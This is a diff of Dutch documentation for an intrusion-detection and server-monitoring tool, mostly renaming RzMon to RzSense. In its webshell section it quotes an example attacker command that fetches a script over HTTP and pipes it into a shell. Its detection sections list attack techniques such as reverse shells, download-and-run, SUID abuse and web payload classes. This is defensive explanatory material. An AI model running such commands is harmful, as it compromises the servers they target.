 - **Vanaf je eigen netwerk** is het 🔴 **critical**, met Pushover: een apparaat in je LAN dat dit doet, is waarschijnlijk besmet (camera, slimme stekker). LAN-adressen worden nooit automatisch geblokkeerd.
 - Op de pagina IDS staan ze onder het filter **🍯 Honeypot**.
 
@@ -2694,7 +2696,7 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - **Webshell:** een webserver (nginx, apache, php-fpm, lighttpd, caddy …) of een webgebruiker (`www-data`, `apache` …) start een shell (`sh`, `bash`) of een netwerkprogramma (`curl`, `wget`, `nc`, `python`, `perl` …). Dat hoort nooit; meestal is via een lek in een website een opdracht uitgevoerd.
   - Critical, ook naar Pushover.
   - PHP-mail via `sendmail` telt niet.
-  - **Voorbeeld:** een lek in een WordPress-plugin. De aanvaller laat de site `sh -c "curl http://…/x.sh | sh"` uitvoeren. De agent ziet `php-fpm` → `sh` → `curl` en RzMon meldt *Mogelijke webshell: php-fpm start sh*.
+  - **Voorbeeld:** een lek in een WordPress-plugin. De aanvaller laat de site `sh -c "curl http://…/x.sh | sh"` uitvoeren. De agent ziet `php-fpm` → `sh` → `curl` en RzSense meldt *Mogelijke webshell: php-fpm start sh*.
 - **Proces stoppen** (modus *blokkeren*, schakelaar *proces meteen stoppen*, standaard uit): de agent stopt het proces bij zijn volgende ronde.
   - Hij controleert eerst of het nog precies hetzelfde proces is (nummer én starttijd), zodat nooit een ander proces geraakt wordt.
   - Het incident vermeldt *⛔ pid … gestopt*.
@@ -2709,7 +2711,7 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - **✅ Vrijgeven:** zet het IP op de ✅ whitelist (1, 7, 30 dagen of altijd). Dan wordt het niet meer gemeld en niet meer geblokkeerd.
 
 **🧰 Hardening-score** (vanaf 1.88.0, agent 1.57.0; aan/uit bij *Instellingen → IDS → Per server*)
-- Elk uur stuurt de agent een paar instellingen die het verschil maken. RzMon maakt er per server een score van 0 tot 100 van (🛡️ bij elke server op de IDS-pagina).
+- Elk uur stuurt de agent een paar instellingen die het verschil maken. RzSense maakt er per server een score van 0 tot 100 van (🛡️ bij elke server op de IDS-pagina).
 - De punten:
   - SSH met wachtwoord, als root of met lege wachtwoorden;
   - een actieve firewall en automatische beveiligingsupdates;
@@ -2721,7 +2723,7 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - **Wordt een punt slechter** (bv. iemand zet root-login via SSH weer aan), dan volgt een incident. Een punt dat al fout was geeft geen melding, alleen een lagere score. Het eerste rapport is de basismeting.
 
 **📜 Logs van webdiensten** (vanaf 1.89.0, agent 1.58.0; *Instellingen → IDS → Netwerk en aanvallers*)
-- **Hoe het werkt:** de agent leest elke minuut de nieuwe regels uit de logs en vat ze per IP samen. RzMon past de scenario's toe en meldt een incident. In de modus blokkeren (en met *blokkeren* aan) wordt het IP ook geblokkeerd, via *Automatische blokkades op alle servers* op al je servers.
+- **Hoe het werkt:** de agent leest elke minuut de nieuwe regels uit de logs en vat ze per IP samen. RzSense past de scenario's toe en meldt een incident. In de modus blokkeren (en met *blokkeren* aan) wordt het IP ook geblokkeerd, via *Automatische blokkades op alle servers* op al je servers.
 - **Bronnen** (elk aan of uit):
   - **SWAG**: de access-log van nginx;
   - **Home Assistant**: mislukte logins in het Core-log;
@@ -2737,15 +2739,15 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
   - **Veel 404** (standaard 20), **veel 401/403** (10), **zonder hostnaam** (444, standaard 5) binnen de tijd (standaard 10 minuten).
   - **Mislukte logins** in Home Assistant of Vaultwarden (standaard 5).
 - **Nooit:** je eigen netwerk (privé-adressen en je lokale netwerken) en de ✅ whitelist. Deblokkeren kan bij *IDS → Blokkades*; de whitelist staat bij *Instellingen → IDS → Netwerk en aanvallers → Whitelist*.
-- **Home Assistant achter SWAG** ziet zonder `use_x_forwarded_for: true` en `trusted_proxies` alleen het IP van SWAG. RzMon herkent dat en zet een ⚠️ bij de gevonden log.
+- **Home Assistant achter SWAG** ziet zonder `use_x_forwarded_for: true` en `trusted_proxies` alleen het IP van SWAG. RzSense herkent dat en zet een ⚠️ bij de gevonden log.
 - **SWAG in Docker:** vanaf agent 1.58.0 blokkeert de agent vóór Docker (prerouting). Daarvoor ging verkeer naar een container (SWAG) langs de blokkade heen.
-- **Voorbeeld:** om 03:12 vraagt `45.148.10.12` op SWAG `/.env` op (404). RzMon meldt *SWAG: aanvalspad /.env* en blokkeert het IP op al je servers. Je Home Assistant, Nextcloud en RzMon achter SWAG zijn meteen beschermd.
+- **Voorbeeld:** om 03:12 vraagt `45.148.10.12` op SWAG `/.env` op (404). RzSense meldt *SWAG: aanvalspad /.env* en blokkeert het IP op al je servers. Je Home Assistant, Nextcloud en RzSense achter SWAG zijn meteen beschermd.
 
 **🧱 Isoleren** (vanaf 1.88.0, agent 1.57.0; via de score bij een server)
-- Bij een hack zet je de server met één klik in quarantaine: alleen RzMon, je lokale netwerken (*Toegang*) en jouw IP-adres kunnen er nog bij. Al het andere verkeer stopt: inkomend, uitgaand en van containers. Een aanvaller verliest zijn verbinding, en malware kan niets meer naar buiten sturen.
+- Bij een hack zet je de server met één klik in quarantaine: alleen RzSense, je lokale netwerken (*Toegang*) en jouw IP-adres kunnen er nog bij. Al het andere verkeer stopt: inkomend, uitgaand en van containers. Een aanvaller verliest zijn verbinding, en malware kan niets meer naar buiten sturen.
 - Je kiest **1 uur, 4 uur, 1 dag of 3 dagen** en bevestigt met je wachtwoord (op het LAN typ je `ISOLEREN`).
-- **Vervalt vanzelf** na die tijd. De agent heft het zelf op, ook als RzMon onbereikbaar is, zodat je jezelf nooit voorgoed buitensluit. Eerder opheffen kan met **🔓 Opheffen**.
-- De agent zet het in een eigen firewalltabel `inet rzmon_iso`. De DNS-servers mogen ook (om RzMon te vinden).
+- **Vervalt vanzelf** na die tijd. De agent heft het zelf op, ook als RzSense onbereikbaar is, zodat je jezelf nooit voorgoed buitensluit. Eerder opheffen kan met **🔓 Opheffen**.
+- De agent zet het in een eigen firewalltabel `inet rzmon_iso`. De DNS-servers mogen ook (om RzSense te vinden).
 - Je krijgt een ℹ️-melding (*🧱 Server geïsoleerd*) via dezelfde kanalen als de andere systeeminfo.
 - **Banner bovenaan** (vanaf 1.172.0): zolang een server geïsoleerd is, staat er over de hele breedte van de **IDS-pagina** een opvallende rode banner *SERVER IN ISOLATIE*, in de stijl van de Live Attack Flow. Per server zie je de naam en het adres, de **reden** (het incident, de EDR-regel of de aanvalsketen; *Handmatig* als iemand het zelf deed), **door wie**, **sinds wanneer**, of de agent het al heeft toegepast (*actief op de server*) en een **afteller** tot het vanzelf vervalt. Op het **Dashboard** en **Monitoring** staat een smallere versie met *Bekijk*.
 - **🔓 Opheffen** (in de banner of in dit venster) vraagt vanaf 1.172.0 ook je wachtwoord (op het LAN typ je `OPHEFFEN`): opheffen haalt de bescherming weg. Alleen beheerders zien de knop.
@@ -2755,7 +2757,7 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - **Vrijgeven** zet het weer open.
 
 **🔎 Tijdlijn per IP** (vanaf 1.88.0)
-- Klik op een IP-adres op de pagina's *Meldingen* en *IDS* of bij *Blokkades*. Je ziet alles wat RzMon van dat adres weet, over al je servers: incidenten, logins en mislukte pogingen, blokkades en het opheffen ervan, meldingen en logins in RzMon zelf.
+- Klik op een IP-adres op de pagina's *Meldingen* en *IDS* of bij *Blokkades*. Je ziet alles wat RzSense van dat adres weet, over al je servers: incidenten, logins en mislukte pogingen, blokkades en het opheffen ervan, meldingen en logins in RzSense zelf.
 - Bovenaan staan het land, of het een bekende aanvaller is, of het op de whitelist staat en waar het nu geblokkeerd is. Met **✅ Op de whitelist** zet je het er meteen op.
 - **Voorbeeld:** `185.220.101.4` werd om 03:12 op SWAG gezien, probeerde om 03:14 SSH op WebServer01 en werd daar geblokkeerd. Om 03:20 werd het via *alle servers* ook op de NAS geblokkeerd. Je ziet het hele verhaal in één venster.
 
@@ -2764,12 +2766,12 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 **📬 Wekelijks overzicht** (vanaf 1.81.0; vanaf 1.180.0 bij *Instellingen → Rapporten*): standaard op **maandag 08:00** per **e-mail** (en/of push, of uit). Met daarin, over de afgelopen 7 dagen: geblokkeerde aanvallen, mislukte SSH-logins en de IP's met de meeste pogingen, hoe vaak de honeypot is aangetikt, SSH-logins van buiten, nieuwe incidenten en wat er nog open staat. Met **Nu versturen** zie je meteen hoe het eruitziet.
 
 **☠️ Bekende aanvallers** (vanaf 1.82.0, agent 1.55.0; *Instellingen → IDS → Netwerk en aanvallers*, standaard aan)
-- RzMon haalt dagelijks twee openbare lijsten op met netwerken van bekende criminelen en botnets: **Spamhaus DROP** (IPv4 en IPv6) en **FireHOL level 1**. Samen zo'n 4.500 bereiken. Privé- en gereserveerde adressen (je LAN) worden er altijd uit gefilterd, net als alles op je ✅ *whitelist*.
+- RzSense haalt dagelijks twee openbare lijsten op met netwerken van bekende criminelen en botnets: **Spamhaus DROP** (IPv4 en IPv6) en **FireHOL level 1**. Samen zo'n 4.500 bereiken. Privé- en gereserveerde adressen (je LAN) worden er altijd uit gefilterd, net als alles op je ✅ *whitelist*.
 - In de modus **blokkeren** zetten de agents ze **vooraf** in hun firewall (een eigen set in `inet rzmon`): die adressen komen niet eens tot een inlogpoging.
 - In de modus **leren** krijgen logins (*Toegang*), incidenten en het weekoverzicht van zo'n adres het label **☠️** (met de naam van de lijst). Een geslaagde SSH-login vanaf zo'n adres is altijd 🔴 critical.
 
 **🌍 Land per IP-adres** (vanaf 1.82.0, standaard aan)
-- RzMon haalt maandelijks de gratis database **DB-IP Lite** op (land per IP, CC BY 4.0). Opzoeken gebeurt daarna op de RzMon-server zelf; er gaat per login niets naar buiten.
+- RzSense haalt maandelijks de gratis database **DB-IP Lite** op (land per IP, CC BY 4.0). Opzoeken gebeurt daarna op de RzSense-server zelf; er gaat per login niets naar buiten.
 - Bij logins, mislukte pogingen, incidenten en blokkades staat het land met een vlag, bijvoorbeeld 🇳🇱 NL (met de naam als tooltip).
 - **Normale landen** (standaard `NL`, aan te vullen, bv. `NL BE DE` of tijdelijk het land van je vakantie): een **SSH-login van buiten vanuit een ander land** is 🔴 **critical**, met Pushover.
 - **Nu bijwerken** haalt de lijsten en het land meteen op en toont hoeveel bereiken er zijn en wanneer.
@@ -2779,7 +2781,7 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 **Na de update naar agent 1.54.0** legt de IDS de extra bestanden en de groepsleden bij het eerste rapport stil vast; je krijgt dus geen stapel meldingen over bestanden die er al waren.
 
 **Basismeting**
-- Als het IDS voor het eerst een rapport van een server krijgt, legt RzMon eerst vast wat er normaal is: standaard **24 uur** (*Basismeting (uren)*). Wat er in die tijd verandert, wordt stil opgenomen.
+- Als het IDS voor het eerst een rapport van een server krijgt, legt RzSense eerst vast wat er normaal is: standaard **24 uur** (*Basismeting (uren)*). Wat er in die tijd verandert, wordt stil opgenomen.
 - **Dit is normaal** bij een incident: afhandelen, en die melding komt op die server niet meer terug.
 - **↺ basismeting opnieuw** (bij de server bovenaan de pagina IDS): na een grote wijziging, bijvoorbeeld een upgrade, alles opnieuw als normaal vastleggen.
 - Installeer je een pakket of werk je de server bij, dan zie je soms meldingen over gewijzigde bestanden. Klopt het, kies dan **✔ Afhandelen**.
@@ -2789,9 +2791,9 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - Er wordt alleen geblokkeerd **op de server die aangevallen wordt**.
 - **Automatisch** bij brute force: **24 uur** (*Blokkeren (uren)*). Was hetzelfde IP de afgelopen **30 dagen** al eens geblokkeerd, dan **7 dagen** (*Bij herhaling (dagen)*). Permanent blokkeren gaat alleen met de hand.
 - **Handmatig** met **⛔ Blokkeer IP** bij een incident of een regel in *Toegang*, of met de knop **⛔ IP blokkeren** bovenaan de pagina IDS (vul zelf een IP-adres in): 24 uur, 7 dagen, 30 dagen of permanent.
-- **Nooit automatisch geblokkeerd:** je LAN (privé-adressen), RzMon zelf en de ✅ *whitelist* (*IDS → ⛔ Blokkades*; tot 1.83.0 de lijst *Nooit blokkeren*). Met de hand blokkeren kan dan ook niet. Een LAN-adres kun je wel zelf blokkeren; je eigen IP-adres niet.
+- **Nooit automatisch geblokkeerd:** je LAN (privé-adressen), RzSense zelf en de ✅ *whitelist* (*IDS → ⛔ Blokkades*; tot 1.83.0 de lijst *Nooit blokkeren*). Met de hand blokkeren kan dan ook niet. Een LAN-adres kun je wel zelf blokkeren; je eigen IP-adres niet.
 - **🔓 Deblokkeren** in het blok *Blokkades*. De agent past het binnen een minuut aan. Eerdere blokkades staan onder *Eerder geblokkeerd*.
-- **Terug naar leren** of **IDS uit**: de agent haalt zijn tabel meteen weg, alle blokkades vervallen op de servers. In RzMon blijven ze staan, zodat ze terugkomen als je weer blokkeert.
+- **Terug naar leren** of **IDS uit**: de agent haalt zijn tabel meteen weg, alle blokkades vervallen op de servers. In RzSense blijven ze staan, zodat ze terugkomen als je weer blokkeert.
 - **Op een server nooit blokkeren:** zet `IDS_BLOCK=0` in `/etc/default/rzmon-agent`. Die server meldt dan wel, maar blokkeert niet.
 - Bovenaan de pagina IDS zie je per server of de firewall werkt: *✔ bewaakt · blokkeren actief*, *alleen melden*, *alleen detecteren* of een foutmelding.
 - **Docker en Podman:** verkeer naar containers met gepubliceerde poorten loopt via *forward*, niet via *input*. Een blokkade geldt dus voor de server zelf (SSH en diensten op de host), niet altijd voor containers.
@@ -2827,12 +2829,12 @@ Naast de vaste gevoelige bestanden kun je zelf paden laten bewaken, bijvoorbeeld
 - **Basismeting:** de eerste keer, en bij een nieuw toegevoegd pad, wordt alles stil vastgelegd. **↺ basismeting opnieuw** legt ook de bewaakte bestanden opnieuw vast.
 - Pakketupdates worden hier niet overgeslagen: in je eigen paden komen ze meestal niet.
 - Bovenaan de pagina IDS staat per server hoeveel bestanden er bewaakt worden (*📁 18 bestanden bewaakt*).
-- **Betrouwbaar:** de agent onthoudt de nieuwe stand pas als RzMon het rapport heeft ontvangen. Mislukt een rapport, dan komt de wijziging bij het volgende rapport alsnog binnen.
+- **Betrouwbaar:** de agent onthoudt de nieuwe stand pas als RzSense het rapport heeft ontvangen. Mislukt een rapport, dan komt de wijziging bij het volgende rapport alsnog binnen.
 - Werkt op Linux-servers en TrueNAS SCALE met agent **1.40.0** of nieuwer, niet in de Home Assistant-add-on.
 
 **🛰️ Endpoint-bewaking** (vanaf 1.110.0, agent 1.63.0)
 
-De agent kijkt nu op het moment zelf mee op de server, en niet pas bij het volgende rapport. RzMon toetst wat hij ziet aan regels, en grijpt zo nodig zelf in.
+De agent kijkt nu op het moment zelf mee op de server, en niet pas bij het volgende rapport. RzSense toetst wat hij ziet aan regels, en grijpt zo nodig zelf in.
 
 - **Wat de agent ziet:**
   - **processen**: elk nieuw programma met opdracht, ouder, gebruiker en map (via `auditd`);
@@ -2842,17 +2844,17 @@ De agent kijkt nu op het moment zelf mee op de server, en niet pas bij het volge
   - **containers**: starten, `exec` en containers met `--privileged` (Docker en Podman);
   - **webverzoeken** via SWAG (zie *Payload-inspectie* hieronder).
 - **Regels:**
-  - de **eigen regels van RzMon**, met uitleg: webshell (een webserver die een shell start), reverse shell, *download en uitvoeren* (`curl … | sh`), programma's uit `/dev/shm` of een verborgen map, cryptominers, history wissen, SUID zetten, SSH-sleutels, uitbreken uit een container, kernelmodules, `ld.so.preload`, nieuwe cron/systemd/ssh-bestanden, een shell met een netwerkverbinding en meer;
+  - de **eigen regels van RzSense**, met uitleg: webshell (een webserver die een shell start), reverse shell, *download en uitvoeren* (`curl … | sh`), programma's uit `/dev/shm` of een verborgen map, cryptominers, history wissen, SUID zetten, SSH-sleutels, uitbreken uit een container, kernelmodules, `ld.so.preload`, nieuwe cron/systemd/ssh-bestanden, een shell met een netwerkverbinding en meer;
   - de **Linux-regels van [SigmaHQ](https://github.com/SigmaHQ/sigma)** (121 regels, *medium* en hoger; licentie DRL 1.1, de maker staat bij elke treffer). *medium* wordt 🟠 warning, *high* 🔴 critical, *critical* ook 🔴 en het proces stoppen.
   - Op *🛡️ IDS → 🔏 Regels* staan ze allemaal, met wat ze doen en hoe vaak ze de laatste 3 dagen raak waren. Een regel zet je daar uit **voor alle servers**; *Dit is normaal* bij een incident geldt voor **één server**.
-- **Een treffer** wordt een IDS-incident, met het bewijs erbij (hooguit 20 per incident) in het blok **Inspectie**: het programma, de opdracht, de ouder, de gebruiker, de verbinding of het bestand, de MITRE ATT&CK-technieken (klikbaar) en wat RzMon deed.
-- **Zelf ingrijpen** (alleen in de modus ⛔ *Blokkeren*; in 🎓 *Leren* wordt het alleen gemeld, met *modus Leren: RzMon greep niet in*):
-  - **proces stoppen** bij een regel die dat zegt (webshell, reverse shell, cryptominer, *download en uitvoeren* …). RzMon stuurt dat versleuteld in het antwoord op het rapport; de agent controleert eerst dat het nog hetzelfde proces is (pid en starttijd) en meldt bij het volgende rapport of het lukte;
+- **Een treffer** wordt een IDS-incident, met het bewijs erbij (hooguit 20 per incident) in het blok **Inspectie**: het programma, de opdracht, de ouder, de gebruiker, de verbinding of het bestand, de MITRE ATT&CK-technieken (klikbaar) en wat RzSense deed.
+- **Zelf ingrijpen** (alleen in de modus ⛔ *Blokkeren*; in 🎓 *Leren* wordt het alleen gemeld, met *modus Leren: RzSense greep niet in*):
+  - **proces stoppen** bij een regel die dat zegt (webshell, reverse shell, cryptominer, *download en uitvoeren* …). RzSense stuurt dat versleuteld in het antwoord op het rapport; de agent controleert eerst dat het nog hetzelfde proces is (pid en starttijd) en meldt bij het volgende rapport of het lukte;
   - **IP blokkeren** bij een webaanval met een herkende payload;
-  - **server isoleren** (24 uur) bij een reverse shell of cryptominer: alleen RzMon en je LAN kunnen er dan nog bij.
-  - Elk van de drie zet je los aan of uit. Wat RzMon deed, staat altijd in het incident; een critical gaat ook naar Pushover.
+  - **server isoleren** (24 uur) bij een reverse shell of cryptominer: alleen RzSense en je LAN kunnen er dan nog bij.
+  - Elk van de drie zet je los aan of uit. Wat RzSense deed, staat altijd in het incident; een critical gaat ook naar Pushover.
 - **🛰️ Live** (*🛡️ IDS → 🛰️ Live*): alles wat de agents de laatste 3 dagen zagen (hooguit 300), met *Alleen treffers*, een filter per server en de treffers per regel. Werkt live bij.
-- **Payload-inspectie van webverzoeken (SWAG):** de agent stuurt verdachte verzoeken mee (met wachtwoorden en tokens weggelakt). RzMon decodeert ze (ook dubbel gecodeerd) en herkent **SQL-injectie, XSS, command injection, path traversal, PHP-wrappers, RFI, Log4Shell, SSRF, Shellshock, SSTI, PHP-code en OGNL**, bekende exploits met hun **CVE** (34 stuks, bv. `eval-stdin.php` = CVE-2017-9841) en scanners (`sqlmap`, `nuclei`, `zgrab` …). Eén incident per IP, met de laatste 10 verzoeken en het verdachte stuk gemarkeerd. Kreeg een verzoek een gewoon antwoord (2xx/3xx), dan staat dat erbij: kijk dan of het lukte. Je LAN en de whitelist worden nooit geblokkeerd.
+- **Payload-inspectie van webverzoeken (SWAG):** de agent stuurt verdachte verzoeken mee (met wachtwoorden en tokens weggelakt). RzSense decodeert ze (ook dubbel gecodeerd) en herkent **SQL-injectie, XSS, command injection, path traversal, PHP-wrappers, RFI, Log4Shell, SSRF, Shellshock, SSTI, PHP-code en OGNL**, bekende exploits met hun **CVE** (34 stuks, bv. `eval-stdin.php` = CVE-2017-9841) en scanners (`sqlmap`, `nuclei`, `zgrab` …). Eén incident per IP, met de laatste 10 verzoeken en het verdachte stuk gemarkeerd. Kreeg een verzoek een gewoon antwoord (2xx/3xx), dan staat dat erbij: kijk dan of het lukte. Je LAN en de whitelist worden nooit geblokkeerd.
 
 **Aanzetten**
 - **Algemeen:** *Instellingen → IDS → Endpoint-bewaking* (standaard aan zodra het IDS aan staat): de bewaking zelf, de Sigma-regels, de payload-inspectie en de drie acties.
@@ -2870,9 +2872,9 @@ De agent kijkt nu op het moment zelf mee op de server, en niet pas bij het volge
 
 **🧬 Afwijkingen, ketens en MITRE** (vanaf 1.111.0)
 
-Bovenop de regels leert RzMon per server wat normaal is, en kijkt hij of losse meldingen samen een aanval vormen.
+Bovenop de regels leert RzSense per server wat normaal is, en kijkt hij of losse meldingen samen een aanval vormen.
 
-- **Leren (standaard 14 dagen):** vanaf de eerste gebeurtenis van de endpoint-bewaking onthoudt RzMon per server welke programma's er draaien en wie ze start, welke gebruikers actief zijn, welke programma's luisteren en naar buiten verbinden (en naar welke landen), welke bestanden, bewaakte paden en container-images er zijn, en hoeveel er per uur gebeurt. In die periode wordt niets als afwijking gemeld.
+- **Leren (standaard 14 dagen):** vanaf de eerste gebeurtenis van de endpoint-bewaking onthoudt RzSense per server welke programma's er draaien en wie ze start, welke gebruikers actief zijn, welke programma's luisteren en naar buiten verbinden (en naar welke landen), welke bestanden, bewaakte paden en container-images er zijn, en hoeveel er per uur gebeurt. In die periode wordt niets als afwijking gemeld.
   - Op *🛡️ IDS → 🧬 Afwijkingen* zie je per server *dag 5 van 14* of *klaar*. Met **Leren afronden** stop je eerder; met **↺ Opnieuw leren** begint een server opnieuw (handig na een grote wijziging, zoals nieuwe software).
 - **Afwijkingen** (na de leerperiode): wat een server nog nooit deed, met een **score** van 0 tot 100:
 
@@ -2891,16 +2893,16 @@ Bovenop de regels leert RzMon per server wat normaal is, en kijkt hij of losse m
 
   - Vanaf **score 40** (instelbaar) wordt een afwijking een IDS-incident (🟠 warning), met het bewijs. Lager staat hij alleen op de pagina. Wat al door een regel gemeld is, telt niet nog eens als afwijking.
   - Wat eenmaal gemeld is, is geleerd: hetzelfde komt niet nog eens.
-- **🔗 Ketens:** na elk rapport kijkt RzMon of de meldingen van die server van het laatste uur (instelbaar) samen het verloop van een aanval vormen. Alle meldingen tellen mee: regeltreffers, afwijkingen en de gewone IDS-incidenten (logins, brute force, webaanvallen, nieuwe gebruikers …).
+- **🔗 Ketens:** na elk rapport kijkt RzSense of de meldingen van die server van het laatste uur (instelbaar) samen het verloop van een aanval vormen. Alle meldingen tellen mee: regeltreffers, afwijkingen en de gewone IDS-incidenten (logins, brute force, webaanvallen, nieuwe gebruikers …).
 
-| Keten | Ernst | Wat RzMon doet (modus ⛔ Blokkeren) |
+| Keten | Ernst | Wat RzSense doet (modus ⛔ Blokkeren) |
 |---|---|---|
 | **Webaanval gevolgd door code op de webserver** (de webserver start iets, of er komt een bestand in de webmap) | 🔴 | de aanvaller(s) blokkeren; de server isoleren als er een critical treffer bij zat (zoals een webshell) |
 | **Inloggen gevolgd door rechten of een achterdeur** (sudoers, nieuwe gebruiker, cron, systemd, SSH-sleutel) | 🔴 bij een verdachte login (nieuw IP, na brute force, ongewoon tijdstip), anders 🟠 | alleen melden |
 | **Programma binnengehaald en daarna contact naar buiten** | 🔴 | het IP van de bestemming blokkeren en de server isoleren |
 | **Meerdere stappen van een aanval** (3 of meer MITRE-tactieken) | 🔴 | alleen melden |
 | **Veel afwijkingen tegelijk** | 🟠 | alleen melden |
-| **Mogelijk verder het netwerk in** (een SSH-login vanaf een andere eigen server waar net een aanval was; werkt als het adres van die server in RzMon een IP-adres is) | 🔴 | alleen melden |
+| **Mogelijk verder het netwerk in** (een SSH-login vanaf een andere eigen server waar net een aanval was; werkt als het adres van die server in RzSense een IP-adres is) | 🔴 | alleen melden |
 
   - Een keten wordt een IDS-incident met **alle stappen in volgorde** (klik op een stap voor dat incident). Ingrijpen gebeurt één keer, als de keten nieuw is; *Ingrijpen bij een keten* zet je los uit.
   - *Ja, dit was ik* bij een keten: die soort keten wordt voor die server niet meer gemeld.
@@ -2912,19 +2914,19 @@ In één oogopslag: waar komt een aanval vandaan, welke server of welk apparaat 
 - **Bovenaan** (vanaf 1.153.0, bij *Attack Flow*) drie kaarten: **Grootste aanvaller nu** (wie in de laatste 15 minuten de meeste pogingen deed: land, IP-adres, dienst, op welke server, de gebruikersnamen die hij probeert, pogingen per minuut met een lijntje, en wat het **IDS** deed: *geblokkeerd op RL01 om 07:53 · daarna 312 pogingen tegengehouden · nog niet op NAS*, met de knop **Overal blokkeren**), **Nu bezig** (hoeveel aanvallers actief zijn en hoeveel pogingen per minuut, per 2 minuten) en **IDS-acties · laatste uur** (geblokkeerd, processen gestopt, nog open, en de laatste actie). Bij de *Wereldkaart* staan de vier tegels van vroeger: aanvallen, bronnen, doelwitten en geblokkeerd.
 - **Filters**: periode (*Nu (15 min)*, 1 uur, 24 uur, 7 of 30 dagen; vanaf 1.153.0), server, land, soort aanval (SSH, webdiensten, honeypot, Suricata, uitgaand) en richting (*Beide*, *Inkomend*, *Uitgaand*).
 - **Live Attack Flow** (vanaf 1.153.0, in de stijl van het vroegere *Stromen*; vanaf 1.154.0 in de kleuren van je thema, licht of donker): links de aanvallers (land, IP-adres, pogingen per minuut en een label *BLOK*, *OPEN* of *INGELOGD*), rechts je servers en apparaten, met vloeiende lijnen ertussen. Op elke lijn staat de dienst met poort en aantal (*SSH · TCP/22 · 312×*) en door wie het gezien is (*auth.log*, *Suricata* …).
-  - **Altijd tien aanvallers** (vanaf 1.172.0): bovenaan staan wie de laatste 15 minuten aanvalt (live, het grootst eerst). De rest van de tien plekken vult RzMon met de grootste aanvallen van de laatste 24 uur (bij 7 of 30 dagen: van die periode). Bij 5 live aanvallen zie je dus nog 5 uit de top 10, bij 2 live nog 8, en is het rustig dan zie je gewoon de top 10. De aangevulde aanvallers zijn **gedimd** (stippelrand, met *top 10 · laatst …*), zodat live altijd opvalt. Meer dan 10 live? Dan de 10 grootste, de rest staat eronder als *+ n kleinere aanvallers*. Bovenaan de stroom staat hoe het nu verdeeld is (*3 live · 7 uit de top 10 van de laatste 24 uur*). De kaartjes bovenaan, de tijdlijn en de tabel *Top 10 aanvallen* volgen nog steeds het venster dat je kiest.
+  - **Altijd tien aanvallers** (vanaf 1.172.0): bovenaan staan wie de laatste 15 minuten aanvalt (live, het grootst eerst). De rest van de tien plekken vult RzSense met de grootste aanvallen van de laatste 24 uur (bij 7 of 30 dagen: van die periode). Bij 5 live aanvallen zie je dus nog 5 uit de top 10, bij 2 live nog 8, en is het rustig dan zie je gewoon de top 10. De aangevulde aanvallers zijn **gedimd** (stippelrand, met *top 10 · laatst …*), zodat live altijd opvalt. Meer dan 10 live? Dan de 10 grootste, de rest staat eronder als *+ n kleinere aanvallers*. Bovenaan de stroom staat hoe het nu verdeeld is (*3 live · 7 uit de top 10 van de laatste 24 uur*). De kaartjes bovenaan, de tijdlijn en de tabel *Top 10 aanvallen* volgen nog steeds het venster dat je kiest.
   - **Deeltjes** lopen over de lijn zolang er in de laatste 15 minuten pogingen zijn: hoe sneller, hoe meer pogingen per minuut. Een lijn zonder deeltjes is in deze periode gezien, maar is nu stil.
   - Een **groen schild** vlak voor de server: het IDS heeft het IP geblokkeerd, de deeltjes stoppen daar. Een **rode ring** om een server: die wordt op dit moment (de laatste 2 minuten) geraakt door een aanvaller die nog niet geblokkeerd is. Een nieuwe aanval (de laatste 5 minuten) tekent zich in, met *NIEUW* op het label.
   - **Uitgaand** (paars): een eigen apparaat dat naar buiten belt; de deeltjes lopen dan van rechts naar links, naar de bestemming.
   - **Live**: bij *Nu* en *1 uur* elke 10 seconden bijgewerkt, bij *24 uur* elke 20 seconden en bij 7 of 30 dagen elke minuut. Naast *LIVE* zie je hoe lang geleden.
   - Hoeveel beweging stel je in bij *Mijn account → Weergave → Beweging in de live Attack Flow* (schuif *Stil · Rustig · Vol*; vanaf 1.162.0 per account). Staat *minder beweging* aan op je apparaat, dan is het altijd stil.
-  - **Waargenomen of afgeleid**: een **doorgetrokken lijn** is verkeer dat echt is gezien; bij de dienst staat door wie (*auth.log*, *log van de webdienst*, *Suricata*, *firewall*, *agent*). Een **stippellijn** is een verband dat RzMon uit meldingen afleidt (een keten, dreigingsinformatie): dat is géén bewezen verkeer. Met *Afgeleide verbanden tonen* uit zie je alleen wat echt is gezien.
-  - **Interne aanvalspaden**: is de bron een server van jou (zijn IP-adres staat bij een server in RzMon), dan staat hij links als *interne aanvaller* in paars. Werd die server eerder zelf aangevallen, dan loopt er een paarse stippellijn van die aanval naar hem: *afgeleid · zelfde server, 40 min later*.
+  - **Waargenomen of afgeleid**: een **doorgetrokken lijn** is verkeer dat echt is gezien; bij de dienst staat door wie (*auth.log*, *log van de webdienst*, *Suricata*, *firewall*, *agent*). Een **stippellijn** is een verband dat RzSense uit meldingen afleidt (een keten, dreigingsinformatie): dat is géén bewezen verkeer. Met *Afgeleide verbanden tonen* uit zie je alleen wat echt is gezien.
+  - **Interne aanvalspaden**: is de bron een server van jou (zijn IP-adres staat bij een server in RzSense), dan staat hij links als *interne aanvaller* in paars. Werd die server eerder zelf aangevallen, dan loopt er een paarse stippellijn van die aanval naar hem: *afgeleid · zelfde server, 40 min later*.
   - **Samenvoegen per IP**: meerdere lijnen van één aanvaller hebben één knoop met het totaal en het aantal samengevoegde meldingen. Zet het uit voor één knoop per lijn.
 - **Tijdlijn** (vanaf 1.153.0 met de knop *🕒 Tijdlijn* rechtsboven in Attack Flow, in een eigen venster): een baan per aanvaller; een punt is een mislukte poging, een ruit een login, een groene streep een blokkade en een ring een melding (open ring = afgeleid). **▶ Afspelen** loopt in 12 seconden van de eerste gebeurtenis tot nu: wat nog niet gebeurd was, is vaag en verschijnt op het moment zelf. **⏭ Stap** springt naar de volgende gebeurtenis, *Alles tonen* stopt.
 - **Live gebeurtenissen** (vanaf 1.153.0): een lopende band met wat er net gebeurde: mislukte SSH-pogingen, logins, blokkades, meldingen en uitgaande verbindingen. Zet de muis erop om hem stil te zetten; klik voor alles over dat IP.
